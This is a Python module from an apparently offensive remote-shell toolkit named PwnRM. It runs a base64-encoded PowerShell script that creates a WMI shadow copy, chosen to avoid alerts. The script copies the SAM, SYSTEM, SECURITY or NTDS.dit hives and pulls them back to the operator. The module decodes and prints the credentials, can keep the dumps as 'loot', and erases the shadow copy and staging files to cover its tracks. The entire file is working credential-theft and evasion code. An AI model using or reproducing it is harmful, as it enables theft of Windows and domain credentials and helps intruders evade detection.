"""Ephemeral Volume Shadow Copy extraction and local secret decoding."""

import re
import secrets
from pathlib import PureWindowsPath
from typing import List, Any
from . import BaseModule
from ..core.credential_dump import parse_registry_artifacts, zeroize
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class VSSModule(BaseModule):
    name = "vss"
    description = "Ephemeral WMI VSS SAM/NTDS extraction and secret display"
    author = "uziii2208"
    options = {
        "--drive": {"desc": "Target drive letter (default: C:)"},
        "sam": {"desc": "Extract SAM and SYSTEM hives to temporary staging path"},
        "ntds": {"desc": "Extract active NTDS.dit and SYSTEM hive (Domain Controllers)"},
        "--download": {"desc": "Retain raw dump artifacts in the local PwnRM loot store"},
        "--clean": {"desc": "Compatibility flag; created shadow copies are always deleted"},
    }

    def run(self, shell, args: List[str]) -> Any:
        drive = "C:"
        retain_download = False
        requested_modes = []
        index = 0
        while index < len(args):
            arg = args[index].lower()
            if arg == "--drive":
                if index + 1 >= len(args) or args[index + 1].startswith("-"):
                    shell.write_error("  [-] --drive requires a drive letter such as C:.")
                    return {"status": "error", "reason": "missing_drive"}
                drive = args[index + 1].rstrip("\\").upper()
                if not drive.endswith(":"):
                    drive += ":"
                index += 2
                continue
            if arg in {"sam", "--sam", "ntds", "--ntds"}:
                requested_modes.append(arg.lstrip("-"))
                index += 1
                continue
            if arg == "--clean":
                index += 1
                continue
            if arg == "--download":
                retain_download = True
                index += 1
                continue
            shell.write_error(f"  [-] Unknown VSS option: {args[index]}")
            return {"status": "error", "reason": "invalid_options"}

        if not re.fullmatch(r"[A-Z]:", drive):
            shell.write_error("  [-] Invalid VSS drive. Expected a drive letter such as C:.")
            return {"status": "error", "reason": "invalid_drive"}

        request_ntds = "ntds" in requested_modes
        request_sam = "sam" in requested_modes
        if request_ntds and request_sam:
            shell.write_error("  [-] Choose either SAM or NTDS extraction, not both.")
            return {"status": "error", "reason": "conflicting_modes"}

        requested_mode = "ntds" if request_ntds else "sam" if request_sam else "auto"
        drive_ps = shell._pse(drive)
        requested_mode_ps = shell._pse(requested_mode)

        try:
            remote_temp = shell._validate_remote_path(
                shell.run_sync("[System.IO.Path]::GetTempPath()").strip()
            )
            staging_name = f"pwnrm_vss_{secrets.token_hex(12)}"
            staging_dir = str(PureWindowsPath(remote_temp) / staging_name)
            staging_dir_ps = shell._pse(staging_dir)
        except (OSError, ValueError) as exc:
            shell.write_error(f"  [-] Could not resolve a safe remote staging directory: {exc}")
            return {"status": "error", "reason": "unsafe_staging_path"}

        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow-copy staging on {drive}..."))

        ps = f"""
$ErrorActionPreference = 'Stop'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM WMI VSS Extraction & Credential Hives" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$drive = '{drive_ps}\\'
$requestedMode = '{requested_mode_ps}'
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
$stagingDir = '{staging_dir_ps}'
$targetHive = switch ($requestedMode) {{
    "ntds" {{ "NTDS.dit" }}
    "sam"  {{ "SAM" }}
    default {{ if ($isDC) {{ "NTDS.dit" }} else {{ "SAM" }} }}
}}

Write-Host "  [*] Target Volume : $drive" -ForegroundColor White
Write-Host "  [*] Target Mode   : $targetHive extraction" -ForegroundColor Gray

# 1. Create Volume Shadow Copy via WMI (No vssadmin.exe / ntdsutil.exe alerts)
Write-Host "`n[1. Creating Ephemeral Shadow Copy via WMI Win32_ShadowCopy]" -ForegroundColor Yellow
$shadowClass = [wmiclass]"Win32_ShadowCopy"
$createResult = $shadowClass.Create($drive, "ClientAccessible")

if ($createResult.ReturnValue -ne 0) {{
    $createCode = [uint32]$createResult.ReturnValue
    $vssErrors = @{{
        1 = "access denied"
        2 = "invalid volume argument"
        3 = "specified volume not found"
        4 = "specified volume is not supported"
        5 = "unsupported shadow-copy context"
        6 = "insufficient storage"
        7 = "volume is in use"
        8 = "maximum number of shadow copies reached"
        9 = "another shadow-copy operation is already in progress"
        10 = "shadow-copy provider vetoed the operation"
        11 = "shadow-copy provider is not registered"
        12 = "shadow-copy provider failure"
        13 = "unknown VSS error"
    }}
    $reason = $vssErrors[[int]$createCode]
    if (-not $reason) {{ $reason = "unrecognized VSS error" }}
    if ($createCode -eq 6) {{
        try {{
            $freeBytes = ([System.IO.DriveInfo]::new($drive)).AvailableFreeSpace
            $reason += " (free space: $freeBytes bytes)"
        }} catch {{}}
    }}
    throw "Failed to create Volume Shadow Copy: $reason (ReturnValue=$createCode)"
}}

$shadowId = $createResult.ShadowID
Write-Host "  [+] Shadow Copy Created successfully! ID: $shadowId" -ForegroundColor Green

$shadow = $null
try {{
    # 2. Retrieve Shadow Copy Device Object Path
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
    $deviceObj = $shadow.DeviceObject
    if (-not $deviceObj) {{ throw "Could not resolve the Shadow Copy DeviceObject" }}
    Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green

    # 3. Extract Target Hives
    Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
    New-Item -Path $stagingDir -ItemType Directory | Out-Null

    # Copy SYSTEM hive
    $sysSrc = "$deviceObj\\Windows\\System32\\config\\SYSTEM"
    $sysDst = Join-Path $stagingDir "SYSTEM"
    [System.IO.File]::Copy($sysSrc, $sysDst, $true)
    $sysSize = (Get-Item $sysDst).Length
    $sysHash = (Get-FileHash -LiteralPath $sysDst -Algorithm SHA256).Hash
    Write-Host "  [+] SYSTEM Hive Extracted : $sysDst ($sysSize bytes)" -ForegroundColor Green
    Write-Host "      SHA-256: $sysHash" -ForegroundColor Gray

    if ($targetHive -eq "NTDS.dit") {{
        $ntdsSrc = "$deviceObj\\Windows\\NTDS\\ntds.dit"
        $ntdsDst = Join-Path $stagingDir "ntds.dit"
        if ([System.IO.File]::Exists($ntdsSrc)) {{
            [System.IO.File]::Copy($ntdsSrc, $ntdsDst, $true)
            $ntdsSize = (Get-Item $ntdsDst).Length
            $ntdsHash = (Get-FileHash -LiteralPath $ntdsDst -Algorithm SHA256).Hash
            Write-Host "  [!] NTDS.DIT Extracted   : $ntdsDst ($ntdsSize bytes)" -ForegroundColor Red
            Write-Host "      SHA-256: $ntdsHash" -ForegroundColor DarkRed
        }} else {{
            throw "ntds.dit was not found on $drive"
        }}
    }} else {{
        $samSrc = "$deviceObj\\Windows\\System32\\config\\SAM"
        $samDst = Join-Path $stagingDir "SAM"
        if ([System.IO.File]::Exists($samSrc)) {{
            [System.IO.File]::Copy($samSrc, $samDst, $true)
            $samSize = (Get-Item $samDst).Length
            $samHash = (Get-FileHash -LiteralPath $samDst -Algorithm SHA256).Hash
            Write-Host "  [+] SAM Hive Extracted    : $samDst ($samSize bytes)" -ForegroundColor Green
            Write-Host "      SHA-256: $samHash" -ForegroundColor Gray
        }} else {{ throw "SAM hive was not found on $drive" }}

        $secSrc = "$deviceObj\\Windows\\System32\\config\\SECURITY"
        $secDst = Join-Path $stagingDir "SECURITY"
        if ([System.IO.File]::Exists($secSrc)) {{
            [System.IO.File]::Copy($secSrc, $secDst, $true)
            Write-Host "  [+] SECURITY Hive Extracted : $secDst" -ForegroundColor Green
        }}
    }}
}} catch {{
    Write-Host "  [-] Error during file extraction: $_" -ForegroundColor Red
    throw
}} finally {{
    # 4. Immediate Forensics Cleanup: Delete Shadow Copy
    Write-Host "`n[3. Deleting Ephemeral Shadow Copy (Forensic Hygiene)]" -ForegroundColor Yellow
    $cleanupShadow = $shadow
    if (-not $cleanupShadow) {{
        $cleanupShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    }}
    if ($cleanupShadow) {{ $null = $cleanupShadow.Delete() }}
    $remainingShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    if ($remainingShadow) {{ throw "Shadow Copy $shadowId still exists after cleanup" }}
    Write-Host "  [+] Shadow Copy $shadowId deleted." -ForegroundColor Green
}}

Write-Host "`n  [*] Ephemeral staging complete; PwnRM will parse and remove $stagingDir." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        artifacts = {}
        result = {"status": "error", "reason": "extraction_failed"}
        error_count = len(getattr(shell, "last_run_errors", []))
        try:
            if shell.run_with_interrupt(cmd, shell.write_line):
                result = {"status": "interrupted"}
            elif len(getattr(shell, "last_run_errors", [])) > error_count:
                result = {
                    "status": "error",
                    "reason": "remote_extraction_failed",
                    "error": "; ".join(shell.last_run_errors[error_count:]),
                }
            else:
                ntds_path = str(PureWindowsPath(staging_dir) / "ntds.dit")
                actual_mode = requested_mode
                if actual_mode == "auto":
                    is_ntds = shell.run_sync(
                        f"Test-Path -LiteralPath '{shell._pse(ntds_path)}' -PathType Leaf"
                    ).strip().lower() == "true"
                    actual_mode = "ntds" if is_ntds else "sam"

                required = ["SYSTEM", "ntds.dit"] if actual_mode == "ntds" else ["SYSTEM", "SAM"]
                if actual_mode == "sam":
                    security_path = str(PureWindowsPath(staging_dir) / "SECURITY")
                    if shell.run_sync(
                        f"Test-Path -LiteralPath '{shell._pse(security_path)}' -PathType Leaf"
                    ).strip().lower() == "true":
                        required.append("SECURITY")

                for name in required:
                    remote_path = str(PureWindowsPath(staging_dir) / name)
                    shell.write_info(c(C, f"  [~] Streaming {name} into protected operator memory..."))
                    artifacts[name] = shell.read_remote_file(remote_path)

                records = parse_registry_artifacts(actual_mode, artifacts)
                shell.write_info(c(M + BLD, f"\n  [*] Extracted {actual_mode.upper()} credential material"))
                if records:
                    for record in records:
                        shell.write_info(f"    {record}")
                else:
                    shell.write_warning("  [-] No printable credential material was extracted.")

                retained = []
                if retain_download:
                    target = str(getattr(shell, "target_info", {}).get("host", "target"))
                    for name, data in artifacts.items():
                        saved = shell.loot_mgr.store_artifact(
                            target,
                            "dumps",
                            f"{staging_name}_{name}",
                            data,
                            source_command=f"!vss {actual_mode} --download",
                        )
                        retained.append(saved)
                        shell.write_info(c(G, f"  [+] Retained dump artifact: {saved}"))
                result = {
                    "status": "completed",
                    "mode": actual_mode,
                    "records": len(records),
                    "downloaded": retained,
                }
        except Exception as exc:
            shell.write_error(f"  [-] VSS credential extraction failed: {exc}")
            result = {"status": "error", "reason": "local_processing_failed", "error": str(exc)}
        finally:
            zeroize(artifacts.values())
            try:
                cleaned = shell.delete_remote_path(staging_dir, recursive=True)
            except Exception as exc:
                cleaned = False
                shell.write_error(f"  [-] Remote VSS staging cleanup failed: {exc}")
            if not cleaned:
                shell.write_error(f"  [-] Remote VSS staging path still requires cleanup: {staging_dir}")
                result = {"status": "error", "reason": "remote_cleanup_failed", "path": staging_dir}
            else:
                shell.write_info(c(G, f"  [+] Remote VSS staging removed: {staging_dir}"))
        return result
